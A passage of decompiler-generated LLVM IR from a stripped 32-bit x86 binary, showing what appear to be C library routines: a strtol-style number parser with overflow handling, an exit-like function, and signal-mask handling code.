dec_label_pc_8053c8d:                             ; preds = %dec_label_pc_8053c74, %dec_label_pc_8053c8d
  %v0_8053c8d = phi i32 [ %v1_8053c8d, %dec_label_pc_8053c8d ], [ %v4_8053c81, %dec_label_pc_8053c74 ]
  %v1_8053c8d = add i32 %v0_8053c8d, 1
  store i32 %v1_8053c8d, i32* %ebx.global-to-local, align 4
  %v1_8053c8e = inttoptr i32 %v1_8053c8d to i8*
  %v2_8053c8e = load i8, i8* %v1_8053c8e, align 1
  %v3_8053c8e = sext i8 %v2_8053c8e to i32
  store i32 %v3_8053c8e, i32* %eax.global-to-local, align 4
  %v2_8053c91 = mul nsw i32 %v3_8053c8e, 2
  %v3_8053c91 = add i32 %v2_8053c91, %v0_8053c7b
  %v4_8053c91 = inttoptr i32 %v3_8053c91 to i8*
  %v5_8053c91 = load i8, i8* %v4_8053c91, align 1
  %v6_8053c91 = and i8 %v5_8053c91, 32
  %v7_8053c91 = icmp eq i8 %v6_8053c91, 0
  %v1_8053c95 = icmp eq i1 %v7_8053c91, false
  br i1 %v1_8053c95, label %dec_label_pc_8053c8d, label %dec_label_pc_8053c97

dec_label_pc_8053c97:                             ; preds = %dec_label_pc_8053c8d, %dec_label_pc_8053c74
  %v0_8053cac = phi i32 [ %v4_8053c81, %dec_label_pc_8053c74 ], [ %v1_8053c8d, %dec_label_pc_8053c8d ]
  %v4_8053cc5 = phi i32 [ %v3_8053c8e9, %dec_label_pc_8053c74 ], [ %v3_8053c8e, %dec_label_pc_8053c8d ]
  %v9_8053c97 = icmp eq i32 %v4_8053cc5, 43
  br i1 %v9_8053c97, label %dec_label_pc_8053cac, label %dec_label_pc_8053c9c

dec_label_pc_8053c9c:                             ; preds = %dec_label_pc_8053c97
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053c9e = icmp eq i32 %v4_8053cc5, 45
  %v1_8053ca1 = icmp eq i1 %v9_8053c9e, false
  br i1 %v1_8053ca1, label %dec_label_pc_8053cad, label %dec_label_pc_8053cac

dec_label_pc_8053cac:                             ; preds = %dec_label_pc_8053c97, %dec_label_pc_8053c9c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8053c9c ], [ 0, %dec_label_pc_8053c97 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8053cac = add i32 %v0_8053cac, 1
  store i32 %v1_8053cac, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_8053cad:                             ; preds = %dec_label_pc_8053c9c, %dec_label_pc_8053cac
  %v0_8053cbf = phi i32 [ %v0_8053cac, %dec_label_pc_8053c9c ], [ %v1_8053cac, %dec_label_pc_8053cac ]
  %v1_8053caf = and i32 %arg3, -17
  %v2_8053caf = icmp eq i32 %v1_8053caf, 0
  %v1_8053cb5 = icmp eq i1 %v2_8053caf, false
  br i1 %v1_8053cb5, label %dec_label_pc_8053cdb, label %dec_label_pc_8053cb7

dec_label_pc_8053cb7:                             ; preds = %dec_label_pc_8053cad
  %v1_8053cb7 = add i32 %arg3, 10
  store i32 %v1_8053cb7, i32* %esi.global-to-local, align 4
  %v1_8053cba = inttoptr i32 %v0_8053cbf to i8*
  %v2_8053cba = load i8, i8* %v1_8053cba, align 1
  %v8_8053cba = icmp eq i8 %v2_8053cba, 48
  %v1_8053cbd = icmp eq i1 %v8_8053cba, false
  br i1 %v1_8053cbd, label %dec_label_pc_8053cd1, label %dec_label_pc_8053cbf

dec_label_pc_8053cbf:                             ; preds = %dec_label_pc_8053cb7
  %v1_8053cbf = add i32 %v0_8053cbf, 1
  store i32 %v1_8053cbf, i32* %ebx.global-to-local, align 4
  %v1_8053cc0 = add i32 %arg3, 8
  store i32 %v1_8053cc0, i32* %esi.global-to-local, align 4
  %v1_8053cc5 = inttoptr i32 %v1_8053cbf to i8*
  %v2_8053cc5 = load i8, i8* %v1_8053cc5, align 1
  %v3_8053cc5 = zext i8 %v2_8053cc5 to i32
  %v5_8053cc5 = and i32 %v4_8053cc5, -256
  %v6_8053cc5 = or i32 %v5_8053cc5, %v3_8053cc5
  %v1_8053cc7 = or i32 %v6_8053cc5, 32
  %v3_8053cc7 = trunc i32 %v1_8053cc7 to i8
  store i32 %v1_8053cc7, i32* %eax.global-to-local, align 4
  %v10_8053cca = icmp eq i8 %v3_8053cc7, 120
  %v1_8053ccc = icmp eq i1 %v10_8053cca, false
  br i1 %v1_8053ccc, label %dec_label_pc_8053cd1, label %dec_label_pc_8053cce

dec_label_pc_8053cce:                             ; preds = %dec_label_pc_8053cbf
  %v2_8053cce = mul i32 %v1_8053cc0, 2
  store i32 %v2_8053cce, i32* %esi.global-to-local, align 4
  %v1_8053cd0 = add i32 %v0_8053cbf, 2
  store i32 %v1_8053cd0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cd1

dec_label_pc_8053cd1:                             ; preds = %dec_label_pc_8053cbf, %dec_label_pc_8053cb7, %dec_label_pc_8053cce
  %v0_8053cfa26 = phi i32 [ %v1_8053cbf, %dec_label_pc_8053cbf ], [ %v0_8053cbf, %dec_label_pc_8053cb7 ], [ %v1_8053cd0, %dec_label_pc_8053cce ]
  %v0_8053d5134 = phi i32 [ %v1_8053cbf, %dec_label_pc_8053cbf ], [ %v4_8053c81, %dec_label_pc_8053cb7 ], [ %v1_8053cbf, %dec_label_pc_8053cce ]
  %v0_8053cd1 = phi i32 [ %v1_8053cc0, %dec_label_pc_8053cbf ], [ %v1_8053cb7, %dec_label_pc_8053cb7 ], [ %v2_8053cce, %dec_label_pc_8053cce ]
  %v7_8053cd4 = icmp sgt i32 %v0_8053cd1, 16
  br i1 %v7_8053cd4, label %dec_label_pc_8053cdb.thread, label %dec_label_pc_8053cdb

dec_label_pc_8053cdb.thread:                      ; preds = %dec_label_pc_8053cd1
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ce5

dec_label_pc_8053cdb:                             ; preds = %dec_label_pc_8053cd1, %dec_label_pc_8053cad
  %v0_8053d5135 = phi i32 [ %v0_8053d5134, %dec_label_pc_8053cd1 ], [ %v4_8053c81, %dec_label_pc_8053cad ]
  %v0_8053cfa27 = phi i32 [ %v0_8053cfa26, %dec_label_pc_8053cd1 ], [ %v0_8053cbf, %dec_label_pc_8053cad ]
  %v0_8053cea = phi i32 [ %v0_8053cd1, %dec_label_pc_8053cd1 ], [ %arg3, %dec_label_pc_8053cad ]
  %v1_8053cdb = add i32 %v0_8053cea, -2
  store i32 %v1_8053cdb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053ce3 = icmp ugt i32 %v1_8053cdb, 34
  br i1 %v6_8053ce3, label %dec_label_pc_8053d46, label %dec_label_pc_8053ce5

dec_label_pc_8053ce5:                             ; preds = %dec_label_pc_8053cdb.thread, %dec_label_pc_8053cdb
  %v0_8053cea59 = phi i32 [ 16, %dec_label_pc_8053cdb.thread ], [ %v0_8053cea, %dec_label_pc_8053cdb ]
  %v0_8053cfa2758 = phi i32 [ %v0_8053cfa26, %dec_label_pc_8053cdb.thread ], [ %v0_8053cfa27, %dec_label_pc_8053cdb ]
  %v0_8053d513557 = phi i32 [ %v0_8053d5134, %dec_label_pc_8053cdb.thread ], [ %v0_8053d5135, %dec_label_pc_8053cdb ]
  %div = udiv i32 -1, %v0_8053cea59
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp52 = urem i32 -1, %v0_8053cea59
  %v1_8053cec = trunc i32 %tmp52 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053d26 = urem i32 %arg4, 256
  br label %dec_label_pc_8053cfa

dec_label_pc_8053cf8:                             ; preds = %dec_label_pc_8053d3c, %dec_label_pc_8053d26
  %v4_8053cfa.pre = phi i32 [ %v1_8053d10, %dec_label_pc_8053d3c ], [ %v4_8053cfa.pre.pre, %dec_label_pc_8053d26 ]
  %v0_8053cf8 = phi i32 [ %v1_8053d17, %dec_label_pc_8053d3c ], [ %v0_8053cf8.pre, %dec_label_pc_8053d26 ]
  br label %dec_label_pc_8053cfa

dec_label_pc_8053cfa:                             ; preds = %dec_label_pc_8053ce5, %dec_label_pc_8053cf8
  %v0_8053d5133 = phi i32 [ %v0_8053d513557, %dec_label_pc_8053ce5 ], [ %v0_8053cf8, %dec_label_pc_8053cf8 ]
  %v0_8053d17 = phi i32 [ %v0_8053cfa2758, %dec_label_pc_8053ce5 ], [ %v0_8053cf8, %dec_label_pc_8053cf8 ]
  %v4_8053cfa = phi i32 [ %div, %dec_label_pc_8053ce5 ], [ %v4_8053cfa.pre, %dec_label_pc_8053cf8 ]
  %v1_8053cfa = inttoptr i32 %v0_8053d17 to i8*
  %v2_8053cfa = load i8, i8* %v1_8053cfa, align 1
  %v3_8053cfa = zext i8 %v2_8053cfa to i32
  %v5_8053cfa = and i32 %v4_8053cfa, -256
  %v6_8053cfa = or i32 %v3_8053cfa, %v5_8053cfa
  store i32 %v6_8053cfa, i32* %eax.global-to-local, align 4
  %v1_8053cfc = add i32 %v6_8053cfa, -48
  %v1_8053cff = trunc i32 %v1_8053cfc to i8
  %tmp60 = icmp ult i8 %v1_8053cff, 10
  br i1 %tmp60, label %dec_label_pc_8053d10, label %dec_label_pc_8053d04

dec_label_pc_8053d04:                             ; preds = %dec_label_pc_8053cfa
  %v1_8053d04 = or i32 %v6_8053cfa, 32
  %v3_8053d04 = trunc i32 %v1_8053d04 to i8
  store i32 %v1_8053d04, i32* %eax.global-to-local, align 4
  %v1_8053d07 = and i32 %v1_8053cfc, -256
  %v2_8053d07 = or i32 %v1_8053d07, 40
  %tmp61 = icmp ult i8 %v3_8053d04, 97
  br i1 %tmp61, label %dec_label_pc_8053d10, label %dec_label_pc_8053d0d

dec_label_pc_8053d0d:                             ; preds = %dec_label_pc_8053d04
  %v1_8053d0d = add i32 %v1_8053d04, -87
  br label %dec_label_pc_8053d10

dec_label_pc_8053d10:                             ; preds = %dec_label_pc_8053d04, %dec_label_pc_8053cfa, %dec_label_pc_8053d0d
  %v0_8053d3f = phi i32 [ %v2_8053d07, %dec_label_pc_8053d04 ], [ %v1_8053cfc, %dec_label_pc_8053cfa ], [ %v1_8053d0d, %dec_label_pc_8053d0d ]
  %v1_8053d10 = urem i32 %v0_8053d3f, 256
  store i32 %v1_8053d10, i32* %eax.global-to-local, align 4
  %v1_8053d13 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053d13 = sub i32 %v1_8053d10, %v1_8053d13
  %v10_8053d13 = and i32 %v2_8053d13, %v1_8053d13
  %v11_8053d13 = icmp slt i32 %v10_8053d13, 0
  %v13_8053d13 = icmp slt i32 %v2_8053d13, 0
  %v2_8053d15 = icmp eq i1 %v13_8053d13, %v11_8053d13
  br i1 %v2_8053d15, label %dec_label_pc_8053d46, label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053d10
  %v1_8053d17 = add i32 %v0_8053d17, 1
  store i32 %v1_8053d17, i32* %ebx.global-to-local, align 4
  %v0_8053d18 = load i32, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v0_8053d18, %div
  br i1 %tmp62, label %dec_label_pc_8053d26, label %dec_label_pc_8053d1e

dec_label_pc_8053d1e:                             ; preds = %dec_label_pc_8053d17
  %v15_8053d18 = icmp eq i32 %v0_8053d18, %div
  %v1_8053d1e = icmp eq i1 %v15_8053d18, false
  br i1 %v1_8053d1e, label %dec_label_pc_8053d3c, label %dec_label_pc_8053d20

dec_label_pc_8053d20:                             ; preds = %dec_label_pc_8053d1e
  %v1_8053d20 = trunc i32 %v0_8053d3f to i8
  %tmp63 = icmp ugt i8 %v1_8053d20, %v1_8053cec
  br i1 %tmp63, label %dec_label_pc_8053d26, label %dec_label_pc_8053d3c

dec_label_pc_8053d26:                             ; preds = %dec_label_pc_8053d20, %dec_label_pc_8053d17
  store i32 %v4_8053d26, i32* %eax.global-to-local, align 4
  %v0_8053d2a = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053d2a = and i32 %v0_8053d2a, %v4_8053d26
  store i32 %v2_8053d2a, i32* %ebp.global-to-local, align 4
  %v1_8053d2c = call i32 @function_8052779(i32 %div)
  store i32 %v1_8053d2c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053d34 = inttoptr i32 %v1_8053d2c to i32*
  store i32 34, i32* %v1_8053d34, align 4
  %v0_8053cf8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053cfa.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053cf8

dec_label_pc_8053d3c:                             ; preds = %dec_label_pc_8053d20, %dec_label_pc_8053d1e
  %v4_8053d3c = mul i32 %v0_8053d18, %v1_8053d13
  store i32 %v1_8053d10, i32* %eax.global-to-local, align 4
  %v2_8053d42 = add i32 %v4_8053d3c, %v1_8053d10
  store i32 %v2_8053d42, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053cf8

dec_label_pc_8053d46:                             ; preds = %dec_label_pc_8053d10, %dec_label_pc_8053cdb
  %v0_8053d51 = phi i32 [ %v0_8053d5135, %dec_label_pc_8053cdb ], [ %v0_8053d5133, %dec_label_pc_8053d10 ]
  %stack_var_-24.0 = phi i32 [ %tmp42, %dec_label_pc_8053cdb ], [ %div, %dec_label_pc_8053d10 ]
  %v4_8053d46 = icmp eq i32 %arg2, 0
  br i1 %v4_8053d46, label %dec_label_pc_8053d53, label %dec_label_pc_8053d4d

dec_label_pc_8053d4d:                             ; preds = %dec_label_pc_8053d46
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053d51 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053d51, i32* %v2_8053d51, align 4
  br label %dec_label_pc_8053d53

dec_label_pc_8053d53:                             ; preds = %dec_label_pc_8053d46, %dec_label_pc_8053d4d
  %v0_8053d53 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053d53, i32* %eax.global-to-local, align 4
  %v1_8053d55 = trunc i32 %v0_8053d53 to i8
  %v6_8053d55 = icmp eq i8 %v1_8053d55, 0
  %v2_8053d57 = zext i1 %v6_8053d55 to i32
  %v1_8053d594 = or i32 %v2_8053d57, -2147483648
  store i32 %v1_8053d594, i32* %ebx.global-to-local, align 4
  %v5_8053d5f = icmp eq i8 %tmp, 0
  br i1 %v5_8053d5f, label %dec_label_pc_8053d77, label %dec_label_pc_8053d66

dec_label_pc_8053d66:                             ; preds = %dec_label_pc_8053d53
  %v0_8053d66 = load i32, i32* %edx.global-to-local, align 4
  %tmp64 = icmp ugt i32 %v0_8053d66, %v1_8053d594
  br i1 %tmp64, label %dec_label_pc_8053d6a, label %dec_label_pc_8053d77

dec_label_pc_8053d6a:                             ; preds = %dec_label_pc_8053d66
  %v1_8053d6a = call i32 @function_8052779(i32 %stack_var_-24.0)
  store i32 %v1_8053d6a, i32* %eax.global-to-local, align 4
  %v0_8053d6f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d6f, i32* %edx.global-to-local, align 4
  %v1_8053d71 = inttoptr i32 %v1_8053d6a to i32*
  store i32 34, i32* %v1_8053d71, align 4
  %v0_8053d77.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053d77

dec_label_pc_8053d77:                             ; preds = %dec_label_pc_8053d66, %dec_label_pc_8053d53, %dec_label_pc_8053d6a
  %v0_8053d77 = phi i32 [ %v0_8053d53, %dec_label_pc_8053d66 ], [ %v0_8053d53, %dec_label_pc_8053d53 ], [ %v0_8053d77.pre, %dec_label_pc_8053d6a ]
  store i32 %v0_8053d77, i32* %eax.global-to-local, align 4
  %v3_8053d79 = trunc i32 %v0_8053d77 to i8
  %v4_8053d79 = icmp eq i8 %v3_8053d79, 0
  %v0_8053d82.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_8053d79, label %dec_label_pc_8053d7f, label %dec_label_pc_8053d7d

dec_label_pc_8053d7d:                             ; preds = %dec_label_pc_8053d77
  %v1_8053d7d = sub i32 0, %v0_8053d82.pre
  store i32 %v1_8053d7d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053d7f

dec_label_pc_8053d7f:                             ; preds = %dec_label_pc_8053d77, %dec_label_pc_8053d7d
  %v0_8053d82 = phi i32 [ %v1_8053d7d, %dec_label_pc_8053d7d ], [ %v0_8053d82.pre, %dec_label_pc_8053d77 ]
  store i32 %v0_8053d82, i32* %eax.global-to-local, align 4
  %v2_8053d84 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053d84, i32* @ebx, align 4
  ret i32 %v0_8053d82

; uselistorder directives
  uselistorder i32 %v0_8053d82, { 1, 0 }
  uselistorder i32 %v0_8053d77, { 1, 0 }
  uselistorder i32 %v0_8053d18, { 0, 2, 1 }
  uselistorder i32 %v1_8053d17, { 1, 0 }
  uselistorder i32 %v2_8053d13, { 1, 0 }
  uselistorder i32 %v1_8053d10, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053d3f, { 1, 0 }
  uselistorder i32 %v0_8053cf8, { 1, 0 }
  uselistorder i32 %v4_8053d26, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8053cea59, { 1, 0 }
  uselistorder i32 %v0_8053d5135, { 1, 0 }
  uselistorder i32 %v2_8053cce, { 1, 0 }
  uselistorder i32 %v1_8053cc7, { 1, 0 }
  uselistorder i32 %v1_8053cc0, { 1, 0, 2 }
  uselistorder i32 %v0_8053cbf, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8053cc5, { 2, 0, 1 }
  uselistorder i32 %v1_8053c8d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053c81, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 17, 14, 15, 16 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d7f, { 1, 0 }
  uselistorder label %dec_label_pc_8053d77, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d53, { 1, 0 }
  uselistorder label %dec_label_pc_8053d10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cfa, { 1, 0 }
  uselistorder label %dec_label_pc_8053ce5, { 1, 0 }
  uselistorder label %dec_label_pc_8053cd1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cad, { 1, 0 }
  uselistorder label %dec_label_pc_8053cac, { 1, 0 }
  uselistorder label %dec_label_pc_8053c8d, { 1, 0 }
}

define i32 @function_8053d89(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d89:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053d9c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053d9c, i32* @ebx, align 4
  %v2_8053da1 = call i32 @function_8054100(i32 %v2_8053d9c, i32 134562045)
  %v1_8053dad = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_80568b0.230 to i32))
  %v0_8053db2 = load i32, i32* @global_var_8056998.231, align 8
  store i32 %v0_8053db2, i32* @eax, align 4
  %v1_8053dba = icmp eq i32 %v0_8053db2, 0
  br i1 %v1_8053dba, label %dec_label_pc_8053dc7, label %dec_label_pc_8053dbe

dec_label_pc_8053dbe:                             ; preds = %dec_label_pc_8053d89
  %v0_8053dc1 = load i32, i32* @esi, align 4
  %v1_8053dc2 = call i32 @unknown_0(i32 %v0_8053dc1)
  store i32 %v1_8053dc2, i32* @eax, align 4
  br label %dec_label_pc_8053dc7

dec_label_pc_8053dc7:                             ; preds = %dec_label_pc_8053d89, %dec_label_pc_8053dbe
  %v2_8053dcc = call i32 @function_8054100(i32 %v2_8053d9c, i32 1)
  %v0_8053dd1 = call i32 @function_80540be()
  %v0_8053dea = load i32, i32* @esi, align 4
  %v1_8053deb = call i32 @function_80544a0(i32 %v0_8053dea)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_80544a0, { 1, 0 }
  uselistorder i32 (i32)* @function_80540fd, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_8054100, { 8, 7, 6, 5, 13, 12, 4, 0, 3, 1, 11, 10, 9, 2 }
  uselistorder label %dec_label_pc_8053dc7, { 1, 0 }
}

define i32 @function_8053df0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053df0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053df0 = load i32, i32* @ebp, align 4
  %v0_8053df1 = load i32, i32* @edi, align 4
  %v0_8053df2 = load i32, i32* @esi, align 4
  %v0_8053df3 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053e06 = icmp eq i32 %arg1, 0
  %v1_8053e08 = icmp eq i1 %v1_8053e06, false
  br i1 %v1_8053e08, label %dec_label_pc_8053e0f.lr.ph, label %dec_label_pc_8053f67

dec_label_pc_8053e0f.lr.ph:                       ; preds = %dec_label_pc_8053df0
  %v15_8053df4 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053e0f56 = add i32 %v15_8053df4, 416
  %v5_8053e0f57 = inttoptr i32 %v4_8053e0f56 to i32*
  store i32 0, i32* %v5_8053e0f57, align 4
  %v0_8053e1a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e1a59 = add i32 %v0_8053e1a58, -1
  %v9_8053e1a60 = icmp slt i32 %v1_8053e1a59, 0
  store i32 %v1_8053e1a59, i32* %eax.global-to-local, align 4
  %v1_8053e1b61 = icmp eq i1 %v9_8053e1a60, false
  br i1 %v1_8053e1b61, label %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge, label %dec_label_pc_8053e1d

dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge: ; preds = %dec_label_pc_8053e0f.lr.ph, %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge
  %v1_8053e1a62 = phi i32 [ %v1_8053e1a, %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge ], [ %v1_8053e1a59, %dec_label_pc_8053e0f.lr.ph ]
  %v0_8053e0f.pre = load i32, i32* @esp, align 4
  %v2_8053e0f = mul i32 %v1_8053e1a62, 4
  %v3_8053e0f = add i32 %v0_8053e0f.pre, 292
  %v4_8053e0f = add i32 %v3_8053e0f, %v2_8053e0f
  %v5_8053e0f = inttoptr i32 %v4_8053e0f to i32*
  store i32 0, i32* %v5_8053e0f, align 4
  %v0_8053e1a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e1a = add i32 %v0_8053e1a, -1
  %v9_8053e1a = icmp slt i32 %v1_8053e1a, 0
  store i32 %v1_8053e1a, i32* %eax.global-to-local, align 4
  %v1_8053e1b = icmp eq i1 %v9_8053e1a, false
  br i1 %v1_8053e1b, label %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge, label %dec_label_pc_8053e1d

dec_label_pc_8053e1d:                             ; preds = %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge, %dec_label_pc_8053e0f.lr.ph
  %v1_8053e1a.lcssa = phi i32 [ %v1_8053e1a59, %dec_label_pc_8053e0f.lr.ph ], [ %v1_8053e1a, %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053e33 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053e33, i32* @ebx, align 4
  store i32 %v2_8053e33, i32* %stack_var_-460, align 4
  %v4_8053e3b = call i32 @function_8052b8e(i32 %v2_8053e33, i32 17, i32 %v1_8053e1a.lcssa, i32 %v1_8053e1a.lcssa)
  store i32 %v4_8053e3b, i32* %eax.global-to-local, align 4
  %v2_8053e43 = icmp slt i32 %v4_8053e3b, 0
  br i1 %v2_8053e43, label %dec_label_pc_8053f6b, label %dec_label_pc_8053e4b

dec_label_pc_8053e4b:                             ; preds = %dec_label_pc_8053e1d
  %v2_8053e4c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053e4c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053e57 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053e57 = call i32 @function_80524ad(i32 0, %_TYPEDEF_sigset_t* %v3_8053e57, i32 %v2_8053e4c)
  store i32 %v4_8053e57, i32* %eax.global-to-local, align 4
  %v1_8053e5f = icmp eq i32 %v4_8053e57, 0
  %v1_8053e61 = icmp eq i1 %v1_8053e5f, false
  br i1 %v1_8053e61, label %dec_label_pc_8053f6b, label %dec_label_pc_8053e67

dec_label_pc_8053e67:                             ; preds = %dec_label_pc_8053e4b
  store i32 %v2_8053e4c, i32* %stack_var_-460, align 4
  %v4_8053e6c = call i32 @function_8052b6a(i32 %v2_8053e4c, i32 17, i32 %v4_8053e57, i32 %v4_8053e57)
  store i32 %v4_8053e6c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053e79 = icmp eq i32 %v4_8053e6c, 0
  br i1 %v1_8053e79, label %dec_label_pc_8053e82.lr.ph, label %dec_label_pc_8053f35

dec_label_pc_8053e82.lr.ph:                       ; preds = %dec_label_pc_8053e67
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8053e0f57, align 4
  %v0_8053e8d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e8d51 = add i32 %v0_8053e8d50, -1
  %v9_8053e8d52 = icmp slt i32 %v1_8053e8d51, 0
  store i32 %v1_8053e8d51, i32* %edx.global-to-local, align 4
  %v1_8053e8e53 = icmp eq i1 %v9_8053e8d52, false
  br i1 %v1_8053e8e53, label %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge, label %dec_label_pc_8053e90

dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge: ; preds = %dec_label_pc_8053e82.lr.ph, %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge
  %v1_8053e8d54 = phi i32 [ %v1_8053e8d, %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge ], [ %v1_8053e8d51, %dec_label_pc_8053e82.lr.ph ]
  %v0_8053e82.pre = load i32, i32* @esp, align 4
  %v2_8053e82 = mul i32 %v1_8053e8d54, 4
  %v3_8053e82 = add i32 %v0_8053e82.pre, 292
  %v4_8053e82 = add i32 %v3_8053e82, %v2_8053e82
  %v5_8053e82 = inttoptr i32 %v4_8053e82 to i32*
  store i32 0, i32* %v5_8053e82, align 4
  %v0_8053e8d = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e8d = add i32 %v0_8053e8d, -1
  %v9_8053e8d = icmp slt i32 %v1_8053e8d, 0
  store i32 %v1_8053e8d, i32* %edx.global-to-local, align 4
  %v1_8053e8e = icmp eq i1 %v9_8053e8d, false
  br i1 %v1_8053e8e, label %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge, label %dec_label_pc_8053e90

dec_label_pc_8053e90:                             ; preds = %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge, %dec_label_pc_8053e82.lr.ph
  store i32 %v2_8053e33, i32* %eax.global-to-local, align 4
  store i32 %v2_8053e33, i32* %stack_var_-460, align 4
  %v4_8053e9c = call i32 @function_8052b8e(i32 %v2_8053e33, i32 17, i32 0, i32 0)
  store i32 %v4_8053e9c, i32* %eax.global-to-local, align 4
  %v2_8053ea4 = icmp slt i32 %v4_8053e9c, 0
  br i1 %v2_8053ea4, label %dec_label_pc_8053f6b, label %dec_label_pc_8053eac

dec_label_pc_8053eac:                             ; preds = %dec_label_pc_8053e90
  %v2_8053ead = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053ead, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053eb6 = call i32 @function_805433f(i32 17, i32* null, i32 %v2_8053ead)
  store i32 %v4_8053eb6, i32* %eax.global-to-local, align 4
  %v2_8053ebe = icmp slt i32 %v4_8053eb6, 0
  %v1_8053ec0 = icmp eq i1 %v2_8053ebe, false
  br i1 %v1_8053ec0, label %dec_label_pc_8053eea, label %dec_label_pc_8053ec2

dec_label_pc_8053ec2:                             ; preds = %dec_label_pc_8053eac
  %v0_8053ec2 = load i32, i32* %stack_var_-460, align 4
  %v1_8053ec2 = call i32 @function_8052779(i32 %v0_8053ec2)
  store i32 %v1_8053ec2, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ec2, i32* @ebx, align 4
  %v1_8053ec9 = inttoptr i32 %v1_8053ec2 to i32*
